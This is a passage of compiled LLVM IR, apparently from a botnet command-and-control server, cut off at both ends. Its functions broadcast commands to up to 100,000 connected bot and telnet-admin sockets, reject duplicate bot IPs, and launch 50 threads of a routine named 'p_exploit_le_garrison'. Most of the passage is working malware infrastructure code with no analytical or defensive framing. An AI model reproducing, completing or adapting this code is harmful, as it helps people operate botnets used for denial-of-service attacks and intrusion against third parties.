  %46 = icmp eq %struct.QueueEntry* %42, null
  br i1 %46, label %47, label %54

47:                                               ; preds = %35
  %48 = load %struct.Queue*, %struct.Queue** %2, align 8
  %49 = getelementptr inbounds %struct.Queue, %struct.Queue* %48, i32 0, i32 8
  %50 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %49, i32 0, i32 0
  %51 = load %struct.Queue*, %struct.Queue** %2, align 8
  %52 = getelementptr inbounds %struct.Queue, %struct.Queue* %51, i32 0, i32 8
  %53 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %52, i32 0, i32 1
  store %struct.QueueEntry** %50, %struct.QueueEntry*** %53, align 8
  br label %54

54:                                               ; preds = %47, %35
  br label %55

55:                                               ; preds = %54
  %56 = load %struct.Queue*, %struct.Queue** %2, align 8
  %57 = getelementptr inbounds %struct.Queue, %struct.Queue* %56, i32 0, i32 4
  %58 = load i32, i32* %57, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %57, align 4
  %60 = load %struct.QueueEntry*, %struct.QueueEntry** %4, align 8
  %61 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %60, i32 0, i32 0
  %62 = load i8*, i8** %61, align 8
  store i8* %62, i8** %3, align 8
  %63 = load %struct.Queue*, %struct.Queue** %2, align 8
  %64 = getelementptr inbounds %struct.Queue, %struct.Queue* %63, i32 0, i32 7
  %65 = load i32, i32* %64, align 8
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %75, label %67

67:                                               ; preds = %55
  %68 = load %struct.Queue*, %struct.Queue** %2, align 8
  %69 = getelementptr inbounds %struct.Queue, %struct.Queue* %68, i32 0, i32 6
  %70 = load i32, i32* %69, align 4
  %71 = load %struct.Queue*, %struct.Queue** %2, align 8
  %72 = getelementptr inbounds %struct.Queue, %struct.Queue* %71, i32 0, i32 7
  %73 = load i32, i32* %72, align 8
  %74 = icmp slt i32 %70, %73
  br i1 %74, label %75, label %96

75:                                               ; preds = %67, %55
  br label %76

76:                                               ; preds = %75
  %77 = load %struct.QueueEntry*, %struct.QueueEntry** %4, align 8
  %78 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %77, i32 0, i32 1
  %79 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %78, i32 0, i32 0
  store %struct.QueueEntry* null, %struct.QueueEntry** %79, align 8
  %80 = load %struct.QueueEntry*, %struct.QueueEntry** %4, align 8
  %81 = load %struct.Queue*, %struct.Queue** %2, align 8
  %82 = getelementptr inbounds %struct.Queue, %struct.Queue* %81, i32 0, i32 9
  %83 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %82, i32 0, i32 1
  %84 = load %struct.QueueEntry**, %struct.QueueEntry*** %83, align 8
  store %struct.QueueEntry* %80, %struct.QueueEntry** %84, align 8
  %85 = load %struct.QueueEntry*, %struct.QueueEntry** %4, align 8
  %86 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %85, i32 0, i32 1
  %87 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %86, i32 0, i32 0
  %88 = load %struct.Queue*, %struct.Queue** %2, align 8
  %89 = getelementptr inbounds %struct.Queue, %struct.Queue* %88, i32 0, i32 9
  %90 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %89, i32 0, i32 1
  store %struct.QueueEntry** %87, %struct.QueueEntry*** %90, align 8
  br label %91

91:                                               ; preds = %76
  %92 = load %struct.Queue*, %struct.Queue** %2, align 8
  %93 = getelementptr inbounds %struct.Queue, %struct.Queue* %92, i32 0, i32 6
  %94 = load i32, i32* %93, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %93, align 4
  br label %99

96:                                               ; preds = %67
  %97 = load %struct.QueueEntry*, %struct.QueueEntry** %4, align 8
  %98 = bitcast %struct.QueueEntry* %97 to i8*
  call void @free(i8* %98) #8
  br label %99

99:                                               ; preds = %96, %91
  %100 = load %struct.Queue*, %struct.Queue** %2, align 8
  %101 = getelementptr inbounds %struct.Queue, %struct.Queue* %100, i32 0, i32 3
  %102 = load i32, i32* %101, align 8
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %113

104:                                              ; preds = %99
  br label %105

105:                                              ; preds = %104
  %106 = load %struct.Queue*, %struct.Queue** %2, align 8
  %107 = getelementptr inbounds %struct.Queue, %struct.Queue* %106, i32 0, i32 2
  %108 = call i32 @pthread_cond_signal(%union.pthread_cond_t* %107) #8
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %110, label %111

110:                                              ; preds = %105
  call void @abort() #9
  unreachable

111:                                              ; preds = %105
  br label %112

112:                                              ; preds = %111
  br label %113

113:                                              ; preds = %112, %99
  br label %114

114:                                              ; preds = %113
  %115 = load %struct.Queue*, %struct.Queue** %2, align 8
  %116 = getelementptr inbounds %struct.Queue, %struct.Queue* %115, i32 0, i32 0
  %117 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %116) #8
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %120

119:                                              ; preds = %114
  call void @abort() #9
  unreachable

120:                                              ; preds = %114
  br label %121

121:                                              ; preds = %120
  %122 = load i8*, i8** %3, align 8
  ret i8* %122
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_length(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  %3 = load %struct.Queue*, %struct.Queue** %2, align 8
  %4 = getelementptr inbounds %struct.Queue, %struct.Queue* %3, i32 0, i32 4
  %5 = load i32, i32* %4, align 4
  ret i32 %5
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_pool_length(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  %3 = load %struct.Queue*, %struct.Queue** %2, align 8
  %4 = getelementptr inbounds %struct.Queue, %struct.Queue* %3, i32 0, i32 6
  %5 = load i32, i32* %4, align 4
  ret i32 %5
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @queue_limit(%struct.Queue* %0, i32 %1) #0 {
  %3 = alloca %struct.Queue*, align 8
  %4 = alloca i32, align 4
  store %struct.Queue* %0, %struct.Queue** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = load %struct.Queue*, %struct.Queue** %3, align 8
  %7 = getelementptr inbounds %struct.Queue, %struct.Queue* %6, i32 0, i32 5
  store i32 %5, i32* %7, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @queue_pool_limit(%struct.Queue* %0, i32 %1) #0 {
  %3 = alloca %struct.Queue*, align 8
  %4 = alloca i32, align 4
  store %struct.Queue* %0, %struct.Queue** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = load %struct.Queue*, %struct.Queue** %3, align 8
  %7 = getelementptr inbounds %struct.Queue, %struct.Queue* %6, i32 0, i32 7
  store i32 %5, i32* %7, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !10

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !11

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !12

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !13

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.tm*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 1, i32* %5, align 4
  %11 = load i8*, i8** %3, align 8
  %12 = call i32 @strcmp(i8* %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #10
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %15

14:                                               ; preds = %2
  store i32 0, i32* %5, align 4
  br label %15

15:                                               ; preds = %14, %2
  %16 = load i8*, i8** %3, align 8
  %17 = call i64 @strlen(i8* %16) #10
  %18 = add i64 %17, 10
  %19 = call noalias align 16 i8* @malloc(i64 %18) #8
  store i8* %19, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = load i8*, i8** %3, align 8
  %22 = call i64 @strlen(i8* %21) #10
  %23 = add i64 %22, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %20, i8 0, i64 %23, i1 false)
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = call i8* @strcpy(i8* %24, i8* %25) #8
  %27 = load i8*, i8** %6, align 8
  call void @trim(i8* %27)
  %28 = call i64 @time(i64* %7) #8
  %29 = call %struct.tm* @localtime(i64* %7) #8
  store %struct.tm* %29, %struct.tm** %8, align 8
  %30 = load %struct.tm*, %struct.tm** %8, align 8
  %31 = call i8* @asctime(%struct.tm* %30) #8
  store i8* %31, i8** %9, align 8
  %32 = load i8*, i8** %9, align 8
  call void @trim(i8* %32)
  store i32 0, i32* %10, align 4
  br label %33

33:                                               ; preds = %102, %15
  %34 = load i32, i32* %10, align 4
  %35 = icmp slt i32 %34, 100000
  br i1 %35, label %36, label %105

36:                                               ; preds = %33
  %37 = load i32, i32* %10, align 4
  %38 = load i32, i32* %4, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %57, label %40

40:                                               ; preds = %36
  %41 = load i32, i32* %10, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %42
  %44 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %43, i32 0, i32 2
  %45 = load i8, i8* %44, align 1
  %46 = icmp ne i8 %45, 0
  br i1 %46, label %58, label %47

47:                                               ; preds = %40
  %48 = load i32, i32* %5, align 4
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %57, label %50

50:                                               ; preds = %47
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [100000 x %struct.telnetdata_t], [100000 x %struct.telnetdata_t]* @managements, i64 0, i64 %52
  %54 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %50, %47, %36
  br label %102

58:                                               ; preds = %50, %40
  %59 = load i32, i32* %5, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %78

61:                                               ; preds = %58
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [100000 x %struct.telnetdata_t], [100000 x %struct.telnetdata_t]* @managements, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %78

68:                                               ; preds = %61
  %69 = load i32, i32* %10, align 4
  %70 = call i64 @send(i32 %69, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %71 = load i32, i32* %10, align 4
  %72 = load i8*, i8** %9, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = call i64 @strlen(i8* %73) #10
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %10, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %78

78:                                               ; preds = %68, %61, %58
  %79 = load i32, i32* %10, align 4
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %79)
  %81 = load i32, i32* %10, align 4
  %82 = load i8*, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = call i64 @strlen(i8* %83) #10
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
  %86 = load i32, i32* %5, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %98

88:                                               ; preds = %78
  %89 = load i32, i32* %10, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [100000 x %struct.telnetdata_t], [100000 x %struct.telnetdata_t]* @managements, i64 0, i64 %90
  %92 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %88
  %96 = load i32, i32* %10, align 4
  %97 = call i64 @send(i32 %96, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %101

98:                                               ; preds = %88, %78
  %99 = load i32, i32* %10, align 4
  %100 = call i64 @send(i32 %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %101

101:                                              ; preds = %98, %95
  br label %102

102:                                              ; preds = %101, %57
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  br label %33, !llvm.loop !14

105:                                              ; preds = %33
  %106 = load i8*, i8** %6, align 8
  call void @free(i8* %106) #8
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #1

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #1

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct._IO_FILE*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr, align 2
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.clientdata_t*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i64, align 8
  %20 = alloca [2048 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %5, align 4
  %23 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  store %struct._IO_FILE* %23, %struct._IO_FILE** %7, align 8
  store i32 0, i32* %5, align 4
  br label %24

24:                                               ; preds = %29, %1
  %25 = load i32, i32* %5, align 4
  %26 = icmp slt i32 %25, 50
  br i1 %26, label %27, label %32

27:                                               ; preds = %24
  %28 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* ()* @p_exploit_le_garrison to i8* (i8*)*), i8* null) #8
  br label %29

29:                                               ; preds = %27
  %30 = load i32, i32* %5, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %5, align 4
  br label %24, !llvm.loop !15

32:                                               ; preds = %24
  %33 = call noalias align 16 i8* @calloc(i64 100000, i64 12) #8
  %34 = bitcast i8* %33 to %struct.epoll_event*
  store %struct.epoll_event* %34, %struct.epoll_event** %4, align 8
  br label %35

35:                                               ; preds = %32, %335
  %36 = load volatile i32, i32* @epollFD, align 4
  %37 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %38 = call i32 @epoll_wait(i32 %36, %struct.epoll_event* %37, i32 100000, i32 -1)
  store i32 %38, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %39

39:                                               ; preds = %332, %35
  %40 = load i32, i32* %10, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %335

43:                                               ; preds = %39
  %44 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %45 = load i32, i32* %10, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i64 %46
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 1
  %50 = and i32 %49, 8
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %70, label %52

52:                                               ; preds = %43
  %53 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %54 = load i32, i32* %10, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i64 %55
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 1
  %59 = and i32 %58, 16
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %70, label %61

61:                                               ; preds = %52
  %62 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i64 %64
  %66 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 1
  %68 = and i32 %67, 1
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %89, label %70

70:                                               ; preds = %61, %52, %43
  %71 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %72 = load i32, i32* %10, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i64 %73
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 1
  %76 = bitcast %union.epoll_data* %75 to i32*
  %77 = load i32, i32* %76, align 1
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %78
  %80 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %79, i32 0, i32 2
  store i8 0, i8* %80, align 1
  %81 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %82 = load i32, i32* %10, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i64 %83
  %85 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %84, i32 0, i32 1
  %86 = bitcast %union.epoll_data* %85 to i32*
  %87 = load i32, i32* %86, align 1
  %88 = call i32 @close(i32 %87)
  br label %332

89:                                               ; preds = %61
  %90 = load volatile i32, i32* @listenFD, align 4
  %91 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %92 = load i32, i32* %10, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %91, i64 %93
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %94, i32 0, i32 1
  %96 = bitcast %union.epoll_data* %95 to i32*
  %97 = load i32, i32* %96, align 1
  %98 = icmp eq i32 %90, %97
  br i1 %98, label %99, label %204

99:                                               ; preds = %89
  br label %100

100:                                              ; preds = %99, %164, %171, %174, %198
  store i32 16, i32* %12, align 4
  %101 = load volatile i32, i32* @listenFD, align 4
  %102 = call i32 @accept(i32 %101, %struct.sockaddr* %11, i32* %12)
  store i32 %102, i32* %13, align 4
  %103 = load i32, i32* %13, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %115

105:                                              ; preds = %100
  %106 = call i32* @__errno_location() #11
  %107 = load i32, i32* %106, align 4
  %108 = icmp eq i32 %107, 11
  br i1 %108, label %113, label %109

109:                                              ; preds = %105
  %110 = call i32* @__errno_location() #11
  %111 = load i32, i32* %110, align 4
  %112 = icmp eq i32 %111, 11
  br i1 %112, label %113, label %114

113:                                              ; preds = %109, %105
  br label %203

114:                                              ; preds = %109
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  br label %203

115:                                              ; preds = %100
  %116 = bitcast %struct.sockaddr* %11 to %struct.sockaddr_in*
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %116, i32 0, i32 2
  %118 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 2
  %120 = load i32, i32* %13, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %121
  %123 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %122, i32 0, i32 0
  store i32 %119, i32* %123, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  br label %124

124:                                              ; preds = %153, %115
  %125 = load i32, i32* %14, align 4
  %126 = icmp slt i32 %125, 100000
  br i1 %126, label %127, label %156

127:                                              ; preds = %124
  %128 = load i32, i32* %14, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 2
  %132 = load i8, i8* %131, align 1
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %127
  %135 = load i32, i32* %14, align 4
  %136 = load i32, i32* %13, align 4
  %137 = icmp eq i32 %135, %136
  br i1 %137, label %138, label %139

138:                                              ; preds = %134, %127
  br label %153

139:                                              ; preds = %134
  %140 = load i32, i32* %14, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 4
  %145 = load i32, i32* %13, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 4
  %150 = icmp eq i32 %144, %149
  br i1 %150, label %151, label %152

151:                                              ; preds = %139
  store i32 1, i32* %15, align 4
  br label %156

152:                                              ; preds = %139
  br label %153

153:                                              ; preds = %152, %138
  %154 = load i32, i32* %14, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %14, align 4
  br label %124, !llvm.loop !16

156:                                              ; preds = %151, %124
  %157 = load i32, i32* %15, align 4
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %159, label %177

159:                                              ; preds = %156
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %161 = load i32, i32* %13, align 4
  %162 = call i64 @send(i32 %161, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i64 13, i32 16384)
  %163 = icmp eq i64 %162, -1
  br i1 %163, label %164, label %167

164:                                              ; preds = %159
  %165 = load i32, i32* %13, align 4
  %166 = call i32 @close(i32 %165)
  br label %100

167:                                              ; preds = %159
  %168 = load i32, i32* %13, align 4
  %169 = call i64 @send(i32 %168, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i64 4, i32 16384)
  %170 = icmp eq i64 %169, -1
  br i1 %170, label %171, label %174

171:                                              ; preds = %167
  %172 = load i32, i32* %13, align 4
  %173 = call i32 @close(i32 %172)
  br label %100

174:                                              ; preds = %167
  %175 = load i32, i32* %13, align 4
  %176 = call i32 @close(i32 %175)
  br label %100

177:                                              ; preds = %156
  %178 = load i32, i32* %13, align 4
  %179 = call i32 @make_socket_non_blocking(i32 %178)
  store i32 %179, i32* %6, align 4
  %180 = load i32, i32* %6, align 4
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %185

182:                                              ; preds = %177
  %183 = load i32, i32* %13, align 4
